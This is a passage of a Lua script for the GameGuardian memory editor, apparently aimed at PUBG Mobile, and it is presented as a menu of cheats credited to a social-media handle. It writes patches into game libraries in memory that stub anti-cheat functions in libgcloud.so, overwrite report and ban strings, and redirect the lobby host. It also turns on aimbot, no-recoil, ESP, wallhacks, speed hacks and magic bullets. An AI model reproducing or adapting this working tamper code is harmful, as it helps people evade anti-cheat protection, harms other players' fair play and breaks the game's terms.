_ENV[""gg""][""alert""]((""LOGO BYPASS DONE""))
end 


function BA2()
if ice1s1 == off then
so=_ENV[""gg""][""getRangesList""]('libgcloud.so')[1].start
setvalue(so + (""0x3B4A8""), 4, (""h 1E FF 2F E1""))
setvalue(so + (""0x3B4B0""), 4, (""h 1E FF 2F E1""))
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
setvalue(so+(""0x2A9DA70""),16,0)--Ping
so = _ENV[""gg""][""getRangesList""]((""libUE4.so""))[1].start
setvalue(so + (""0x211D22A""), 32, (""h 62 61 6E 64""))
setvalue(so + (""0x1F664A1""), 32, (""h 62 61 6E 64""))
setvalue(so + (""0x1F122D6""), 32, (""h 72 65 70 6F 72 74""))
setvalue(so + (""0x1FF1C08""), 32, (""h 72 65 70 6F 72 74""))
setvalue(so + (""0x2025D22""), 32, (""h 72 65 70 6F 72 74""))
setvalue(so + (""0x8B05F32""), 32, (""h 72 65 70 6F 72 74""))
setvalue(so + (""0x8B0CC1C""), 32, (""h 72 65 70 6F 72 74""))
setvalue(so + (""0x8B3642C""), 32, (""h 61 6E 64 72 6F 69 64 5F""))
setvalue(so + (""0x8B38039""), 32, (""h 61 6E 64 72 6F 69 64 5F""))
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_C_ALLOC""] | _ENV[""gg""][""REGION_OTHER""] )
_ENV[""gg""][""searchNumber""](("":lobby.igamecj.com""))
_ENV[""gg""][""refineNumber""](("":lobby.igamecj.com""),1)
_ENV[""gg""][""getResults""](99700)
_ENV[""gg""][""editAll""](("":XXXXX.XXXXXXX.XXX""), 1)
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""toast""](("" On""))
ice1s1 = on
else
so=_ENV[""gg""][""getRangesList""]('libgcloud.so')[1].start
setvalue(so + (""0x3B4A8""), 4, (""h 03 C6 8F E2""))
setvalue(so + (""0x3B4B0""), 4, (""h 1C F6 BC E5""))
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_C_ALLOC""] | _ENV[""gg""][""REGION_OTHER""])
_ENV[""gg""][""searchNumber""](("":XXXXX.XXXXXXX.XXX""))
_ENV[""gg""][""getResults""](99700)
_ENV[""gg""][""editAll""](("":lobby.igamecj.com""), 1)
_ENV[""gg""][""clearResults""]()
ice1s1= off
end
end


function B2()
bbb = _ENV[""gg""][""multiChoice""]({
(""🔥ᴀɪᴍʙᴏᴏᴛ🔥 ""..'\n'..""""),--1
(""🐶 ʟᴇss ʀᴇᴄᴏɪʟ🐶""..'\n'..""""),--2
(""👿 ᴀɴᴛɪ sʜᴀᴋᴇ 👿 ""..'\n'..""""),--3
(""👽 ʜᴇᴀᴅ sʜᴏᴛ 👽 ""..'\n'..""""),--4
(""👹 ᴍᴀɢɪᴄ sʜᴏᴛ 👹""..'\n'..""""),--5
(""🟡 ʏᴇʟʟᴏᴡ x-ʜɪᴛ ᴇғғᴇᴄᴛ ❌ ""..'\n'..""""),--6
(""🔵 ᴄʏᴀɴ x-ʜɪᴛ ᴇғғᴇᴄᴛ ❌ ""..'\n'..""""),--7
(""🟣 ᴘᴜʀᴘʟᴇ x-ʜɪᴛ ᴇғғᴇᴄᴛ ❌ ""..'\n'..""""),--8
(""🟢 ɢʀᴇᴇɴ x-ʜɪᴛ ᴇғғᴇᴄᴛ ❌ ""..'\n'..""""),--9
(""🟢 ʀᴇᴅ x-ʜɪᴛ ᴇғғᴇᴄᴛ ❌ ""..'\n'..""""),--10
(""♐ ʙʟᴜᴇ x-ʜɪᴛ ᴇғғᴇᴄᴛ ❌ ""..'\n'..""""),--11
(""❌ mixed x-ʜɪᴛ ᴇғғᴇᴄᴛ ❌ ""..'\n'..""""),--12
(""⧾sᴍᴀʟʟ ᴄʀᴏssʜɪʀᴇ⧾ ""..'\n'..""""),--13
("" 🕸️ ɴᴏʀᴍᴀʟ ᴇsᴘ 🕸️ ""..'\n'.."" ""),--14
("" 🧿 ᴍᴏᴠɪɴɢ 360° ᴇsᴘ 🧿 ""..'\n'.."" ""),--15
("" 🧞‍♀️ ʟᴏɴɢ ʜᴀɴᴅ 🧞‍♀️ ""..'\n'.."" ""),--16
(""🏠༼ʜᴏᴍᴇ༽🏠"")
}, nil, ("" Cʀᴇᴀᴛᴏʀ @VN_IRAQ_ANDRID_OFFICIAL ""))

if bbb == nil then else
if bbb[1]== true then BB1() end
if bbb[2]== true then BB2() end
if bbb[3]== true then BB3() end
if bbb[4]== true then BB4() end
if bbb[5]== true then BB5() end
if bbb[6]== true then BB6() end
if bbb[7]== true then BB7() end
if bbb[8]== true then BB8() end
if bbb[9]== true then BB9() end
if bbb[10]== true then BB10() end
if bbb[11]== true then BB11() end
if bbb[12]== true then BB12() end
if bbb[13]== true then BB13() end
if bbb[14]== true then BB14() end
if bbb[15]== true then BB15() end
if bbb[16]== true then BB16() end
if bbb[17]== true then HOME() end
end
PUBGMH = -1
end

function BB1()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x195705C          
setvalue(so+py,16,0)
_ENV[""gg""][""toast""]((""ᴀɪᴍʟᴏᴄᴋ ""))
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x3B61740          
setvalue(so+py,16,0)
_ENV[""gg""][""toast""]((""ᴀɪᴍʙᴏᴏᴛ ""))
end

function BB2()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0xDB4C38          
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""ʟᴇss ʀᴇᴄᴏɪʟ ""))
end

function BB3()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0xDB4C38          
setvalue(so+py,4,0)
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x26C4D0C          
setvalue(so+py,16,0)
_ENV[""gg""][""toast""]((""ɴᴏ sʜᴀᴋᴇ ""))
end

function BB4()
Name = (""No Spread"")
qmnb = 
{ 
{[(""memory"")] = 32}, 
{[(""name"")] = (""Body Hit"")}, 
{[(""value"")] = 4740038608910024704, [(""type"")] = 32}, 
{[(""lv"")] = 4752423507886342144, [(""offset"")] = 4, [(""type"")] = 32}, 
{[(""lv"")] = 1106509824, [(""offset"")] = 8, [(""type"")] = 32}, 
}
qmxg = 
{
{[(""value"")] = 700, [(""offset"")] = 4, [(""type"")] = 16},
 {[(""value"")] = 700, [(""offset"")] = 8, [(""type"")] = 16},
 } 
xqmnb(qmnb) 
qmnb = 
{ 
{[(""memory"")] = 32}, 
{[(""name"")] = (""Running Shot"")}, 
{[(""value"")] = 4719772412750681353, [(""type"")] = 32}, 
{[(""lv"")] = 4742290408720039936, [(""offset"")] = 4, [(""type"")] = 32}, 
}
qmxg = 
{
{[(""value"")] = -460, [(""offset"")] = 8, [(""type"")] = 16},
 } 
xqmnb(qmnb) 
qmnb = 
{ 
{[(""memory"")] = 32}, 
{[(""name"")] = (""Moving Shot"")}, 
{[(""value"")] = -4417614866316724128, [(""type"")] = 32}, 
{[(""lv"")] = 4724276012378061487, [(""offset"")] = 4, [(""type"")] = 32}, 
}
qmxg = 
{
{[(""value"")] = -560, [(""offset"")] = 12, [(""type"")] = 16},
 } 
xqmnb(qmnb) 
qmnb = 
{ 
{[(""memory"")] = 32}, 
{[(""name"")] = (""Sky Shot"")}, 
{[(""value"")] = -4416487068034336677, [(""type"")] = 32}, 
{[(""lv"")] = 4724276012378324073, [(""offset"")] = 4, [(""type"")] = 32}, 
}
qmxg = 
{
{[(""value"")] = -660, [(""offset"")] = 8, [(""type"")] = 16},
{[(""value"")] = -660, [(""offset"")] = 12, [(""type"")] = 16},
 } 
xqmnb(qmnb) 
_ENV[""gg""][""toast""]((""Headshot Done""))
_ENV[""gg""][""setRanges""](32)
_ENV[""gg""][""searchNumber""]((""25;30.5""), _ENV[""gg""][""TYPE_FLOAT""], false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1)
_ENV[""gg""][""getResults""](999)
_ENV[""gg""][""editAll""]((""370;375""), _ENV[""gg""][""TYPE_FLOAT""])
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_ANONYMOUS""])
_ENV[""gg""][""searchNumber""]((""25;23;30.5""), _ENV[""gg""][""TYPE_FLOAT""], false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1)
_ENV[""gg""][""getResults""](3)
_ENV[""gg""][""editAll""]((""370;375""), _ENV[""gg""][""TYPE_FLOAT""])
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_ANONYMOUS""])
_ENV[""gg""][""searchNumber""]((""30.5;25""), _ENV[""gg""][""TYPE_FLOAT""], false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1)
_ENV[""gg""][""getResults""](10)
_ENV[""gg""][""editAll""]((""370;375""), _ENV[""gg""][""TYPE_FLOAT""])
_ENV[""gg""][""clearResults""]()

_ENV[""gg""][""toast""](("" Magic Bullets  ""))

end

function BB5()
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_C_DATA""] | _ENV[""gg""][""REGION_CODE_APP""])
_ENV[""gg""][""searchNumber""]((""-298284466;-1.304566e23F""), 4, false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1)
_ENV[""gg""][""searchNumber""]((""-298284466""), 4, false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1)
_ENV[""gg""][""getResults""](99)
_ENV[""gg""][""editAll""]((""0""), 4)
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_C_DATA""] | _ENV[""gg""][""REGION_CODE_APP""])
_ENV[""gg""][""searchNumber""]((""-1,883,348,481,058,764,210""), _ENV[""gg""][""TYPE_QWORD""], false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1)
_ENV[""gg""][""searchNumber""]((""-1,883,348,481,058,764,210""), _ENV[""gg""][""TYPE_QWORD""], false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1)
_ENV[""gg""][""getResults""](99)
_ENV[""gg""][""editAll""]((""-1,883,348,485,055,444,540""), _ENV[""gg""][""TYPE_QWORD""])
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""toast""]((""😈Instant HiT😈""))
end

function BB6()
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x1172778
setvalue(so + py, 4, 0)
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x117276C
setvalue(so + py, 4, 0)
_ENV[""gg""][""clearResults""]()
so = _ENV[""gg""][""getRangesList""]((""libUE4.so""))[1].start 
setvalue(so+(""0x1172770""),4,0)
_ENV[""gg""][""setRanges""](32)
_ENV[""gg""][""searchNumber""]((""10;45""), 16)
_ENV[""gg""][""searchNumber""]((""10""), 16)
_ENV[""gg""][""getResults""](900)
_ENV[""gg""][""editAll""]((""999""), 16)
_ENV[""gg""][""clearResults""]() 
_ENV[""gg""][""toast""]((""x-ᴋɪʟʟ ᴇғғᴇᴄᴛ ""))
end

function BB7()
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x1172768
setvalue(so + py, 4, 0)
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x1172778
setvalue(so + py, 4, 0)
_ENV[""gg""][""setRanges""](32)
_ENV[""gg""][""searchNumber""]((""10;45""), 16)
_ENV[""gg""][""searchNumber""]((""10""), 16)
_ENV[""gg""][""getResults""](900)
_ENV[""gg""][""editAll""]((""999""), 16)
_ENV[""gg""][""clearResults""]() 
_ENV[""gg""][""toast""]((""x-ᴋɪʟʟ ᴇғғᴇᴄᴛ ""))
end

function BB8()
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x1172768
setvalue(so + py, 4, 0)
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x1172770
setvalue(so + py, 4, 0)
_ENV[""gg""][""setRanges""](32)
_ENV[""gg""][""searchNumber""]((""10;45""), 16)
_ENV[""gg""][""searchNumber""]((""10""), 16)
_ENV[""gg""][""getResults""](900)
_ENV[""gg""][""editAll""]((""999""), 16)
_ENV[""gg""][""clearResults""]() 
_ENV[""gg""][""toast""]((""x-ᴋɪʟʟ ᴇғғᴇᴄᴛ ""))
end

function BB9()
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x1172768
setvalue(so + py, 4, 0)
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x117276C
setvalue(so + py, 4, 0)
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x1172778
setvalue(so + py, 4, 0)
_ENV[""gg""][""setRanges""](32)
_ENV[""gg""][""searchNumber""]((""10;45""), 16)
_ENV[""gg""][""searchNumber""]((""10""), 16)
_ENV[""gg""][""getResults""](900)
_ENV[""gg""][""editAll""]((""999""), 16)
_ENV[""gg""][""clearResults""]() 
_ENV[""gg""][""toast""]((""x-ᴋɪʟʟ ᴇғғᴇᴄᴛ ""))
end

function BB10()
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x1172768
setvalue(so + py, 4, 0)
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x117276C
setvalue(so + py, 4, 0)
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x1172770
setvalue(so + py, 4, 0)
_ENV[""gg""][""setRanges""](32)
_ENV[""gg""][""searchNumber""]((""10;45""), 16)
_ENV[""gg""][""searchNumber""]((""10""), 16)
_ENV[""gg""][""getResults""](900)
_ENV[""gg""][""editAll""]((""999""), 16)
_ENV[""gg""][""clearResults""]() 
_ENV[""gg""][""toast""]((""x-ᴋɪʟʟ ᴇғғᴇᴄᴛ ""))
end

function BB11()
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x1172768
setvalue(so + py, 4, 0)
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x1172778
setvalue(so + py, 4, 0)
so = _ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x1172770
setvalue(so + py, 4, 0)
_ENV[""gg""][""setRanges""](32)
_ENV[""gg""][""searchNumber""]((""10;45""), 16)
_ENV[""gg""][""searchNumber""]((""10""), 16)
_ENV[""gg""][""getResults""](900)
_ENV[""gg""][""editAll""]((""999""), 16)
_ENV[""gg""][""clearResults""]() 
_ENV[""gg""][""toast""]((""x-ᴋɪʟʟ ᴇғғᴇᴄᴛ ""))
end 

function BB12()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x1172718          
setvalue(so+py,16,0)
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x117272C          
setvalue(so+py,16,0)
_ENV[""gg""][""clearResults""]()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x117276C          
setvalue(so+py,16,0)
_ENV[""gg""][""clearResults""]()
so = _ENV[""gg""][""getRangesList""]((""libUE4.so""))[1].start 
setvalue(so+(""0x1172770""),4,0)
_ENV[""gg""][""setRanges""](32)
_ENV[""gg""][""searchNumber""]((""10;45""), 16)
_ENV[""gg""][""searchNumber""]((""10""), 16)
_ENV[""gg""][""getResults""](900)
_ENV[""gg""][""editAll""]((""999""), 16)
_ENV[""gg""][""clearResults""]() 
_ENV[""gg""][""toast""]((""x-ᴋɪʟʟ ᴇғғᴇᴄᴛ ""))
end 


function BB13()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0xDB51F8          
setvalue(so+py,16,90)
_ENV[""gg""][""toast""]((""sᴍᴀʟʟ ᴄʀᴏssʜɪʀᴇ ᴏɴ ""))
end

function BB14()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0xBD7398          
setvalue(so+py,4,0)
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0xBD5928          
setvalue(so+py,4,-476053503)
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0xBD59C0          
setvalue(so+py,4,-476053503)
_ENV[""gg""][""toast""]((""ɴᴏʀᴍᴀʟ ᴇsᴘ ᴏɴ ""))
end

function BB15()
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0xBD739C
setvalue(so+py,4,0)
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0x195705C
setvalue(so+py,4,0) 
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0xBD5928
setvalue(so+py,4,-476053503)
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0xBD825C
setvalue(so+py,4,2046820353)
_ENV[""gg""][""toast""]((""ᴍᴏᴠɪɴɢ ᴇsᴘ ᴏɴ ""))
end

function BB16()
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_ANONYMOUS""])
_ENV[""gg""][""searchNumber""]((""-4,663,166,567,012,541,625;4,138,667,321,167,981,973:33""), _ENV[""gg""][""TYPE_QWORD""], false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1)
_ENV[""gg""][""searchNumber""]((""4138667321167981973""), _ENV[""gg""][""TYPE_QWORD""], false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1)
_ENV[""gg""][""getResults""](100)
_ENV[""gg""][""editAll""]((""4848124999984742400""), _ENV[""gg""][""TYPE_QWORD""])
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""toast""]((""long hand""))
end

function B3()
ccc = _ENV[""gg""][""multiChoice""]({
(""🎭 ᴡᴀʟʟ & ᴄᴏʟᴏᴜʀ ʜᴀᴄᴋ ᴠ1 🎭""..'\n'..""""),--1
(""🎭 ᴡᴀʟʟ & ᴄᴏʟᴏᴜʀ ʜᴀᴄᴋ ᴠ2 🎭""..'\n'..""""),--2
(""🎭 ᴡᴀʟʟ & ᴄᴏʟᴏᴜʀ ʜᴀᴄᴋ ᴠ3 🎭 ""..'\n'..""""),--3
(""🎭 ᴡᴀʟʟ & ᴄᴏʟᴏᴜʀ ʜᴀᴄᴋ ᴠ4 🎭""..'\n'..""""),--4
(""🎭 ᴡᴀʟʟ & ᴄᴏʟᴏᴜʀ ʜᴀᴄᴋ ᴠ5 🎭""..'\n'..""""),--5
("" 🥳 ᴀɴᴛᴇɴᴀ ʜᴇᴀᴅ 🥳 ""..'\n'..""""),--6
(""🏠༼ʜᴏᴍᴇ༽🏠"")
}, nil, ("" Cʀᴇᴀᴛᴏʀ @VN_IRAQ_ANDRID_OFFICIAL ""))

if ccc == nil then else
if ccc[1]== true then BC1() end
if ccc[2]== true then BC2() end
if ccc[3]== true then BC3() end
if ccc[4]== true then BC4() end
if ccc[5]== true then BC5() end
if ccc[6]== true then BC6() end
if ccc[7]== true then HOME() end
end
PUBGMH = -1
end

function BC1()
_ENV[""gg""][""setRanges""]( _ENV[""gg""][""REGION_ANONYMOUS""] )
_ENV[""gg""][""searchNumber""]((""67109377""), 4)
_ENV[""gg""][""getResults""](80000)
_ENV[""gg""][""editAll""]((""0""), 4)
_ENV[""gg""][""toast""]((""Exceptional colour 720G""))
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_VIDEO""] or _ENV[""gg""][""REGION_BAD""])
_ENV[""gg""][""searchNumber""]((""24581.546875F;2.0F;2.663242e-39F:501""), _ENV[""gg""][""TYPE_FLOAT""],false, _ENV[""gg""][""SIGN_EQUAL""],0, -1)
_ENV[""gg""][""refineNumber""]((""2""), _ENV[""gg""][""TYPE_FLOAT""],false, _ENV[""gg""][""SIGN_EQUAL""],0, -1)
_ENV[""gg""][""getResults""](10, nil, nil, nil, nil, nil, nil, nil, nil)
_ENV[""gg""][""editAll""]((""150""), _ENV[""gg""][""TYPE_FLOAT""])
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""searchNumber""]((""11264.0F;24580.5F;3.375F;2.0F;1.0F:2401""), _ENV[""gg""][""TYPE_FLOAT""],false, _ENV[""gg""][""SIGN_EQUAL""],0, -1)
_ENV[""gg""][""refineNumber""]((""2""), _ENV[""gg""][""TYPE_FLOAT""],false, _ENV[""gg""][""SIGN_EQUAL""],0, -1)
_ENV[""gg""][""getResults""](10, nil, nil, nil, nil, nil, nil, nil, nil)
_ENV[""gg""][""editAll""]((""150""), _ENV[""gg""][""TYPE_FLOAT""])
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""toast""]((""Wallhack Sd 720G""))
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_VIDEO""] or _ENV[""gg""][""REGION_BAD""])
_ENV[""gg""][""searchNumber""]((""8200D;8203D:17""), 4,false, _ENV[""gg""][""SIGN_EQUAL""],0, -1)
_ENV[""gg""][""getResults""](10, nil, nil, nil, nil, nil, nil, nil, nil)
_ENV[""gg""][""editAll""]((""7;8""), 4)
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""toast""]((""720G""))
_ENV[""gg""][""toast""]((""Done""))
end

function BC2()
_ENV[""gg""][""setRanges""]( _ENV[""gg""][""REGION_ANONYMOUS""] )
_ENV[""gg""][""searchNumber""]((""67109377""), 4)
_ENV[""gg""][""getResults""](80000)
_ENV[""gg""][""editAll""]((""0""), 4)
_ENV[""gg""][""toast""]((""Exceptional colour 720G""))
_ENV[""gg""][""clearResults""]()
local  dataType  =  32
local  search  =  {{2325053982390616064,   0},}
local  modify  =  {{2325053982439899136,  0},}
SearchWrite(search,modify,dataType,Name)
local  search  =  {{2325053844951662592,   0},}
local  modify  =  {{2325053845000945664,  0},}
SearchWrite(search,modify,dataType,Name)
local  search  =  {{-4647714814372610048,   0},{4575657221408423936,   8},{4500782613132083200,   16},}
local  modify  =  {{-4647714814323326976,  0},}
SearchWrite(search,modify,dataType,Name)
local  search  =  {{5129670391563821064,  0},{5129680343003045897,  8},{5129811245016293387,  16},}
local  modify  =  {{5129670391563812871,  0},{5129680343003037703,  8},{5129811245016285193,  16},}
SearchWrite(search,modify,dataType,Name)
_ENV[""gg""][""clearList""]()
_ENV[""gg""][""toast""]((""wall hack""))
end

function BC3()
_ENV[""gg""][""setRanges""](1048576 or 131072)
local  dataType  =  32
local  search  =  {{2325053982390616064,   0},}
local  modify  =  {{2325053982439899136,  0},}
SearchWrite(search,modify,dataType,Name)
local  search  =  {{2325053844951662592,   0},}
local  modify  =  {{2325053845000945664,  0},}
SearchWrite(search,modify,dataType,Name)
local  search  =  {{-4647714814372610048,   0},{4575657221408423936,   8},{4500782613132083200,   16},}
local  modify  =  {{-4647714814323326976,  0},}
SearchWrite(search,modify,dataType,Name)
local  search  =  {{5129670391563821064,  0},{5129680343003045897,  8},{5129811245016293387,  16},}
local  modify  =  {{5129670391563812871,  0},{5129680343003037703,  8},{5129811245016285193,  16},}
SearchWrite(search,modify,dataType,Name)
_ENV[""gg""][""clearList""]()
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_VIDEO""] or _ENV[""gg""][""REGION_BAD""])
_ENV[""gg""][""searchNumber""]((""8200D;8203D:17""), 4,false, _ENV[""gg""][""SIGN_EQUAL""],0, -1)
_ENV[""gg""][""getResults""](10, nil, nil, nil, nil, nil, nil, nil, nil)
_ENV[""gg""][""editAll""]((""7;8""), 4)
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""toast""]((""WH+BL SD665/SD675 ACTIVATED""))
end

function BC4()
readWrite({{false,8200,0,4,nil,nil},{8201,8,4},{8202,16,4},{1194377232,28,4}},{{7,0,4,false},{7,28,4,false}},4,1048576,(""Creater Colour ""))
readWrite({{false,738197510,0,4,nil,nil},{1077936133,4,4},{8200,8,4}},{{5,8,4,false}},4,1048576,(""Hair Colour ""))
readWrite({{false,8200,0,4,nil,nil},{1194346756,4,4},{8202,8,4}},{{6,0,4,false}},4,1048576,(""BAG Colour ""))
readWrite({{false,5129823236564983816,0,32,nil,nil}},{{0,0,4,false}},4,1048576,(""Gun Colour ""))
readWrite({{false,8200,0,4,nil,nil},{1194347024,4,4},{917515,8,4},{1080033294,12,4}},{{0,0,4,false}},4,1048576,(""Tree Colour ""))
readWrite({{false,8200,0,4,nil,nil},{1194363656,4,4},{671236101,8,4}},{{0,0,4,false}},4,1048576,(""SKY Colour ""))
readWrite({{false,1686274049,0,4,nil,nil},{1073741824,220,4}},{{1123024896,220,4,false}},4,1048576,(""660 Wallhack ""))
readWrite({{false,1669496837,0,4,nil,nil},{50331648,8,4},{1073741824,56,4}},{{1123024896,56,4,false}},4,1048576,(""440 Wallhack ""))
readWrite({{false,4197,0,4,nil,nil},{1669431303,4,4},{-2146888784,8,4}},{{1168777216,8,4,false}},4,1048576,(""440 Wallhack ""))
_ENV[""gg""][""toast""]((""S660 ACTIVE""))
end

function BC5()
Name = (""Hire colour"") local Range = 1048576 local Type = 4 local YK = {{8200, 0},{1194380061, 4},{-1598024689, 12}} local DK = {{7, 0}} MASTER(Range, Type, YK, DK)
Name = (""gun colour"") local Range = 1048576 local Type = 4 local YK = {{8200, 0},{1194380059, 4},{71303173, 8}} local DK = {{14, 0}} MASTER(Range, Type, YK, DK)
Name = (""body colour"") local Range = 1048576 local Type = 4 local YK = {{8200, 0},{1194380056, 4},{1081084160, 12}} local DK = {{7, 0}} MASTER(Range, Type, YK, DK)
Name = (""bag colour"") local Range = 1048576 local Type = 4 local YK = {{8200, 0},{278921224, 8},{1081606152, 20}} local DK = {{6, 0}} MASTER(Range, Type, YK, DK)
Name = (""sky colour"") local Range = 1048576 local Type = 4 local YK = {{8200, 0},{1194363655, 4},{268435456, 16}} local DK = {{3, 0}} MASTER(Range, Type, YK, DK)
Name = (""wallhack 665"") local Range = 1048576 local Type = 16 local YK = {{2.0, 0},{1.66230461e-19, 4},{1.93438323e-39, 8},{4.94373923e21, 12}} local DK = {{150, 0}} MASTER(Range, Type, YK, DK)
Name = (""wallhack 665"") local Range = 1048576 local Type = 16 local YK = {{2.0, 0},{-1.0, 4},{0.0, 8},{1.0, 12}} local DK = {{150, 0}} MASTER(Range, Type, YK, DK)
_ENV[""gg""][""toast""]((""S665ACTIVE""))
end

function BC6()
readWrite({{false,-100.91194152832,0,16,nil,nil},{87.27782440186,-4,16},{88.50576019287,-8,16},{1.4012985e-45,16,16}},{{1.96875,-8,16,false},{1.96875,-4,16,false},{999999,4,16,false},{2,8,16,false}},16,32,(""Helmet antenna""))
_ENV[""gg""][""toast""]((""Antena Done""))
end

function B4()
ddd = _ENV[""gg""][""multiChoice""]({
(""⚡ғɪʀsᴛ ʟᴀɴᴅɪɴɢ ⚡""),--1
(""🐒 ʟᴏɴɢ ᴊᴜᴍᴘ🐒"")..long1s1,--2
(""🚖 ʟɪʙʙᴀsᴇ ᴄᴀʀ sᴘᴇᴇᴅ 🚖"")..carspeed,--3
(""🛹sʟᴏᴡ ᴍᴏᴛɪᴏɴ🧍"")..fspeed1,--4
("" 🏃‍♀️ ᴍɪᴄʀᴏ sᴘᴇᴇᴅ+ ᴄᴀʀ ғʟᴀsʜ 🚗"")..fspeed2,--5
(""🏃‍♂️ ᴏʟᴅ ғʟᴀsʜ sʟᴏᴡᴍᴏ🏃‍♂️"")..fspeed3,--6
(""👩‍🦯 ғɪx sᴛᴜᴄᴋ v2 👩‍🦯""),--7
(""🚙ᴄᴀʀ ᴊᴜᴍᴘ🚙"")..cjump,--8
(""🏠༼ʜᴏᴍᴇ༽🏠"")
}, nil, ("" Cʀᴇᴀᴛᴏʀ @VN_IRAQ_ANDRID_OFFICIAL""))

if ddd == nil then else
if ddd[1]== true then BD1() end
if ddd[2]== true then BD2() end
if ddd[3]== true then BD3() end
if ddd[4]== true then BD4() end
if ddd[5]== true then BD5() end
if ddd[6]== true then BD6() end
if ddd[7]== true then BD7() end
if ddd[8]== true then BD8() end
if ddd[9]== true then HOME() end
end
PUBGMH = -1
end

function BD1()
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_ANONYMOUS""])
_ENV[""gg""][""searchNumber""]((""3000;5000;1024;1000::""), _ENV[""gg""][""TYPE_FLOAT""], false, _ENV[""gg""][""SIGN_EQUAL""], 0, -1)
_ENV[""gg""][""getResults""](3472849)
_ENV[""gg""][""editAll""]((""999999""), _ENV[""gg""][""TYPE_FLOAT""])
_ENV[""gg""][""toast""](("" First Landing ""))
end 

function BD2()
if long1s1 == off then
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py=0xCB1E64          
setvalue(so+py,16,-2.83335992e28)
_ENV[""gg""][""toast""]((""Long Jump On ""))
long1s1 = on
else
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0xCB1E64
setvalue(so+py,16,-1.41959378e28)
long1s1 = off
_ENV[""gg""][""toast""]((""Long Jump Off ""))
end
end

function BD3()
if carspeed == off then
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x337E4A4 
setvalue(so+py,4,0)
_ENV[""gg""][""toast""]((""Car Speed On ""))
carspeed = on
else
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x337E4A4 
setvalue(so+py,4,-298354069)
_ENV[""gg""][""toast""]((""Car Speed Off ""))
carspeed = off
end
end

function BD4()
if fspeed1 == off then
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x2684E88 
setvalue(so+py,16,5.6)
_ENV[""gg""][""toast""]((""On""))
fspeed1 = on
else
so=_ENV[""gg""][""getRangesList""]('libUE4.so')[1].start
py = 0x2684E88 
setvalue(so+py,16,0)
_ENV[""gg""][""toast""]((""OFF ""))
fspeed1 = off
end
end

function BD5()
if fspeed2 == off then
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""setVisible""](false)
_ENV[""gg""][""setRanges""](_ENV[""gg""][""REGION_ANONYMOUS""])
